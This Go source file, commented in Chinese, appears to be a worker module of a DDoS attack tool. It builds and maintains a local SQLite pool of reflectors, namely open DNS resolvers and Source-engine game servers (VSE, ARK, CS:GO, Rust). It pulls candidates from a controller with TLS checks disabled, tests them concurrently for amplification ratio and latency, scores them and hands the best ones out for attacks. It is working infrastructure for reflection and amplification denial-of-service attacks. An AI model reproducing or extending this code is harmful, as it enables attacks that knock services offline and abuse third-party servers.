package worker

import (
	"crypto/tls"
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	"newtool/internal/attack"

	_ "modernc.org/sqlite"
)

// LocalReflector 本地反射器记录
type LocalReflector struct {
	IP           string  `json:"ip"`
	Port         int     `json:"port"`
	Game         string  `json:"game"`
	Country      string  `json:"country"`
	ResponseSize int     `json:"response_size"`
	AmpRatio     float64 `json:"amp_ratio"`
	AmpDomain    string  `json:"amp_domain"`
	LatencyMs    int     `json:"latency_ms"`
	SuccessCount int     `json:"success_count"`
	FailCount    int     `json:"fail_count"`
	LastTested   int64   `json:"last_tested"`
	LastValid    int64   `json:"last_valid"`
	AddedAt      int64   `json:"added_at"`
	Score        float64 `json:"score"`
}

// TestResult 测试结果
type TestResult struct {
	IP           string
	Port         int
	Game         string
	Success      bool
	LatencyMs    int
	ResponseSize int
	AmpRatio     float64
	AmpDomain    string
	HasChallenge bool
	Error        string
}

// LocalReflectorPool Worker 本地反射器池
type LocalReflectorPool struct {
	db             *sql.DB
	workerLocation string // "CN", "US", "JP" etc.
	controllerURL  string
	authToken      string

	// 测试参数
	testConcurrency int           // 并发测试数, 默认200
	testTimeout     time.Duration // 单个测试超时, 默认3s
	maxLatency      int           // 最大延迟(ms), 默认300

	// 定时器
	refreshTicker *time.Ticker // 3小时
	stopChan      chan struct{}

	// ready 为 1 表示 InitialSync 完成，可以使用本地池数据
	ready int32

	mu sync.RWMutex
}

// NewLocalReflectorPool 创建本地池
func NewLocalReflectorPool(dbPath, location, ctrlURL, token string) (*LocalReflectorPool, error) {
	db, err := sql.Open("sqlite", dbPath+"?_pragma=journal_mode(WAL)&_pragma=busy_timeout(5000)")
	if err != nil {
		return nil, fmt.Errorf("open db: %w", err)
	}

	// 初始化表结构
	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS local_reflectors (
			ip TEXT NOT NULL,
			port INTEGER NOT NULL,
			game TEXT NOT NULL,
			country TEXT DEFAULT '',
			response_size INTEGER DEFAULT 0,
			amp_ratio REAL DEFAULT 0.0,
			amp_domain TEXT DEFAULT '',
			latency_ms INTEGER DEFAULT 0,
			success_count INTEGER DEFAULT 0,
			fail_count INTEGER DEFAULT 0,
			last_tested INTEGER DEFAULT 0,
			last_valid INTEGER DEFAULT 0,
			added_at INTEGER DEFAULT 0,
			score REAL DEFAULT 0.0,
			PRIMARY KEY (ip, port, game)
		);
		CREATE INDEX IF NOT EXISTS idx_local_game ON local_reflectors(game);
		CREATE INDEX IF NOT EXISTS idx_local_score ON local_reflectors(game, score DESC);

		CREATE TABLE IF NOT EXISTS worker_config (
			key TEXT PRIMARY KEY,
			value TEXT
		);
	`)
	if err != nil {
		return nil, fmt.Errorf("init schema: %w", err)
	}

	p := &LocalReflectorPool{
		db:              db,
		workerLocation:  location,
		controllerURL:   ctrlURL,
		authToken:       token,
		testConcurrency: 200,
		testTimeout:     3 * time.Second,
		maxLatency:      300,
		stopChan:        make(chan struct{}),
	}

	return p, nil
}

// Start 启动本地池（异步初始化 + 定期刷新）
// 立即返回，InitialSync 在后台 goroutine 中执行。
// 攻击开始前可通过 IsReady() 判断池是否已就绪；未就绪时 Worker 自动 fallback 到 Controller 全局池。
func (p *LocalReflectorPool) Start() error {
	p.refreshTicker = time.NewTicker(3 * time.Hour)

	go func() {
		// 首次同步
		if err := p.InitialSync(); err != nil {
			log.Printf("[local_pool] initial sync failed: %v", err)
		}
		atomic.StoreInt32(&p.ready, 1)
		log.Printf("[local_pool] ready: location=%s", p.workerLocation)

		// 定期重测
		for {
			select {
			case <-p.refreshTicker.C:
				p.PeriodicTest()
			case <-p.stopChan:
				return
			}
		}
	}()

	log.Printf("[local_pool] started (background init): location=%s interval=3h", p.workerLocation)
	return nil
}

// IsReady 返回本地池初始同步是否完成
func (p *LocalReflectorPool) IsReady() bool {
	return atomic.LoadInt32(&p.ready) == 1
}

// UpdateControllerURL 更新 Controller HTTP 地址（在 Connect() 后、Start() 前调用）
func (p *LocalReflectorPool) UpdateControllerURL(url string) {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.controllerURL = url
}

// Stop 停止本地池
func (p *LocalReflectorPool) Stop() error {
	if p.refreshTicker != nil {
		p.refreshTicker.Stop()
	}
	close(p.stopChan)
	return p.db.Close()
}

// InitialSync 首次拉取和测试
func (p *LocalReflectorPool) InitialSync() error {
	log.Printf("[local_pool] initial sync starting...")

	// DNS 池: 优先同国家
	if err := p.syncGame("dns"); err != nil {
		log.Printf("[local_pool] dns sync failed: %v", err)
	}

	// VSE 池: 拉取全部
	if err := p.syncGame("vse"); err != nil {
		log.Printf("[local_pool] vse sync failed: %v", err)
	}

	return nil
}

// syncGame 同步指定游戏类型的反射器
func (p *LocalReflectorPool) syncGame(game string) error {
	// 从 Controller 拉取候选
	candidates, err := p.FetchCandidates(game)
	if err != nil {
		return fmt.Errorf("fetch candidates: %w", err)
	}

	if len(candidates) == 0 {
		log.Printf("[local_pool] %s: no candidates", game)
		return nil
	}

	log.Printf("[local_pool] %s: fetched %d candidates, testing...", game, len(candidates))

	// 并发测试
	results := p.TestCandidates(candidates)

	// 存储有效的
	valid := 0
	for _, r := range results {
		if r.Success {
			if err := p.StoreTested(r); err != nil {
				log.Printf("[local_pool] store error: %v", err)
			} else {
				valid++
			}
		}
	}

	log.Printf("[local_pool] %s: tested %d, valid %d, stored to local pool", game, len(results), valid)
	return nil
}

// FetchCandidates 从 Controller 拉取候选池
func (p *LocalReflectorPool) FetchCandidates(game string) ([]Candidate, error) {
	var url string
	if game == "dns" {
		// DNS 优先同国家
		url = fmt.Sprintf("%s/api/reflectors/candidates?game=dns&country=%s&limit=1000", p.controllerURL, p.workerLocation)
	} else {
		// VSE 拉取全部
		url = fmt.Sprintf("%s/api/reflectors/candidates?game=%s&limit=2000", p.controllerURL, game)
	}

	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Authorization", "Bearer "+p.authToken)

	// 允许自签证书：Controller 启用 TLS 时使用自签证书
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("http %d", resp.StatusCode)
	}

	var candidates []Candidate
	if err := json.NewDecoder(resp.Body).Decode(&candidates); err != nil {
		return nil, err
	}

	// 如果 DNS 没有同国家的，拉取全部
	if game == "dns" && len(candidates) == 0 {
		url = fmt.Sprintf("%s/api/reflectors/candidates?game=dns&limit=1000", p.controllerURL)
		req, _ = http.NewRequest("GET", url, nil)
		req.Header.Set("Authorization", "Bearer "+p.authToken)
		resp, err = client.Do(req)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()
		json.NewDecoder(resp.Body).Decode(&candidates)
	}

	return candidates, nil
}

// Candidate 候选反射器
type Candidate struct {
	IP        string `json:"ip"`
	Port      int    `json:"port"`
	Game      string `json:"game"`
	Country   string `json:"country"`
	Continent string `json:"continent"`
}

// TestCandidates 并发测试候选反射器
func (p *LocalReflectorPool) TestCandidates(candidates []Candidate) []TestResult {
	results := make([]TestResult, 0, len(candidates))
	var mu sync.Mutex

	sem := make(chan struct{}, p.testConcurrency)
	var wg sync.WaitGroup

	for _, c := range candidates {
		c := c
		wg.Add(1)
		sem <- struct{}{}
		go func() {
			defer wg.Done()
			defer func() { <-sem }()

			var result TestResult
			switch c.Game {
			case "dns":
				result = p.testDNSReflector(c.IP, c.Port)
			case "vse", "ark", "csgo", "rust":
				result = p.testVSEReflector(c.IP, c.Port)
			default:
				result = TestResult{IP: c.IP, Port: c.Port, Game: c.Game, Success: false}
			}

			result.Game = c.Game
			mu.Lock()
			results = append(results, result)
			mu.Unlock()
		}()
	}
	wg.Wait()

	return results
}

// testDNSReflector 测试 DNS 反射器
func (p *LocalReflectorPool) testDNSReflector(ip string, port int) TestResult {
	start := time.Now()

	result := attack.ScanDNSResolver(ip, port, p.testTimeout)
	if result == nil {
		return TestResult{IP: ip, Port: port, Success: false, LatencyMs: 9999}
	}

	latency := int(time.Since(start).Milliseconds())

	// 筛选规则: 响应 >= 500B, 无TC标志, 延迟 < maxLatency
	if result.ResponseSize < 500 || result.TC || latency > p.maxLatency {
		return TestResult{
			IP:        ip,
			Port:      port,
			Success:   false,
			LatencyMs: latency,
		}
	}

	return TestResult{
		IP:           ip,
		Port:         port,
		Success:      true,
		LatencyMs:    latency,
		ResponseSize: result.ResponseSize,
		AmpRatio:     result.AmpRatio,
		AmpDomain:    result.BestDomain,
		HasChallenge: result.HasChallenge,
	}
}

// testVSEReflector 测试 VSE 反射器
func (p *LocalReflectorPool) testVSEReflector(ip string, port int) TestResult {
	start := time.Now()

	result := attack.ScanIP(ip, port, p.testTimeout)
	if result == nil {
		return TestResult{IP: ip, Port: port, Success: false, LatencyMs: 9999}
	}

	latency := int(time.Since(start).Milliseconds())

	// 筛选规则: 延迟 < maxLatency
	if latency > p.maxLatency {
		return TestResult{
			IP:        ip,
			Port:      port,
			Success:   false,
			LatencyMs: latency,
		}
	}

	return TestResult{
		IP:           ip,
		Port:         port,
		Success:      true,
		LatencyMs:    latency,
		ResponseSize: result.ResponseSize,
		HasChallenge: result.HasChallenge,
	}
}

// StoreTested 存储测试结果到本地池
func (p *LocalReflectorPool) StoreTested(r TestResult) error {
	now := time.Now().Unix()
	score := p.calculateScore(1, 0, r.LatencyMs, r.AmpRatio)

	_, err := p.db.Exec(`
		INSERT INTO local_reflectors (ip, port, game, response_size, amp_ratio, amp_domain,
			latency_ms, success_count, fail_count, last_tested, last_valid, added_at, score)
		VALUES (?, ?, ?, ?, ?, ?, ?, 1, 0, ?, ?, ?, ?)
		ON CONFLICT(ip, port, game) DO UPDATE SET
			response_size = excluded.response_size,
			amp_ratio = excluded.amp_ratio,
			amp_domain = excluded.amp_domain,
			latency_ms = excluded.latency_ms,
			success_count = success_count + 1,
			last_tested = excluded.last_tested,
			last_valid = excluded.last_valid,
			score = excluded.score
	`, r.IP, r.Port, r.Game, r.ResponseSize, r.AmpRatio, r.AmpDomain,
		r.LatencyMs, now, now, now, score)

	return err
}

// calculateScore 计算质量评分
// 评分公式: 成功率*40 + (1-延迟比)*30 + 放大倍数*20 + 稳定性*10
func (p *LocalReflectorPool) calculateScore(successCount, failCount, latencyMs int, ampRatio float64) float64 {
	total := successCount + failCount
	if total == 0 {
		total = 1
	}

	successRate := float64(successCount) / float64(total)
	latencyScore := 1.0 - float64(latencyMs)/float64(p.maxLatency)
	if latencyScore < 0 {
		latencyScore = 0
	}

	ampScore := ampRatio / 50.0
	if ampScore > 1 {
		ampScore = 1
	}

	score := successRate*40 + latencyScore*30 + ampScore*20 + 10 // 稳定性基础分10
	return score
}

// GetReflectors 获取本地池反射器（供攻击使用）
func (p *LocalReflectorPool) GetReflectors(game string, limit int) []string {
	p.mu.RLock()
	defer p.mu.RUnlock()

	rows, err := p.db.Query(`
		SELECT ip, port, amp_domain
		FROM local_reflectors
		WHERE game = ? AND last_valid > 0
		ORDER BY score DESC, latency_ms ASC
		LIMIT ?
	`, game, limit)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var targets []string
	for rows.Next() {
		var ip string
		var port int
		var ampDomain string
		if err := rows.Scan(&ip, &port, &ampDomain); err != nil {
			continue
		}
		targets = append(targets, fmt.Sprintf("%s:%d|%s", ip, port, ampDomain))
	}

	return targets
}

// PeriodicTest 定期重测所有本地池条目
func (p *LocalReflectorPool) PeriodicTest() {
	log.Printf("[local_pool] periodic test starting...")

	games := []string{"dns", "vse", "ark", "csgo", "rust"}
	for _, game := range games {
		p.retestGame(game)
	}

	// 清理失效条目
	p.Cleanup()
}

// retestGame 重测指定游戏的所有本地条目
func (p *LocalReflectorPool) retestGame(game string) {
	rows, err := p.db.Query("SELECT ip, port FROM local_reflectors WHERE game = ?", game)
	if err != nil {
		return
	}
	defer rows.Close()

	var candidates []Candidate
	for rows.Next() {
		var ip string
		var port int
		rows.Scan(&ip, &port)
		candidates = append(candidates, Candidate{IP: ip, Port: port, Game: game})
	}

	if len(candidates) == 0 {
		return
	}

	log.Printf("[local_pool] retesting %s: %d entries", game, len(candidates))
	results := p.TestCandidates(candidates)

	now := time.Now().Unix()
	for _, r := range results {
		if r.Success {
			p.db.Exec(`
				UPDATE local_reflectors
				SET success_count = success_count + 1, last_tested = ?, last_valid = ?,
					latency_ms = ?, response_size = ?, amp_ratio = ?, amp_domain = ?,
					score = ?
				WHERE ip = ? AND port = ? AND game = ?
			`, now, now, r.LatencyMs, r.ResponseSize, r.AmpRatio, r.AmpDomain,
				p.calculateScore(1, 0, r.LatencyMs, r.AmpRatio), r.IP, r.Port, r.Game)
		} else {
			// 失败：fail_count+1 且 score 减半。只加 fail_count 的话，
			// 死反射器仍以最高分占据 GetReflectors 的列表头部
			// （score DESC），连续 3 次失败被 Cleanup 删除前会持续
			// 被攻击打向死目标。
			p.db.Exec(`
				UPDATE local_reflectors
				SET fail_count = fail_count + 1, last_tested = ?,
					last_valid = ?, score = score * 0.5
				WHERE ip = ? AND port = ? AND game = ?
			`, now, 0, r.IP, r.Port, r.Game)
		}
	}
}

// Cleanup 清理失效条目
func (p *LocalReflectorPool) Cleanup() error {
	// 连续 3 次失败 → 删除
	result, err := p.db.Exec("DELETE FROM local_reflectors WHERE fail_count >= 3 AND last_valid < last_tested")
	// Exec 失败时 Result 为 nil，直接调 RowsAffected 会空指针 panic
	if err != nil || result == nil {
		return err
	}
	n, _ := result.RowsAffected()
	if n > 0 {
		log.Printf("[local_pool] cleanup: removed %d failed entries", n)
	}
	return nil
}

// OnPoolUpdateSignal 收到 Controller 池更新信号后触发
func (p *LocalReflectorPool) OnPoolUpdateSignal(game string) {
	log.Printf("[local_pool] received pool update signal: game=%s", game)
	if err := p.syncGame(game); err != nil {
		log.Printf("[local_pool] sync after signal failed: %v", err)
	}
}

// GetPoolSize 获取本地池大小
func (p *LocalReflectorPool) GetPoolSize(game string) int {
	var count int
	p.db.QueryRow("SELECT COUNT(*) FROM local_reflectors WHERE game = ?", game).Scan(&count)
	return count
}
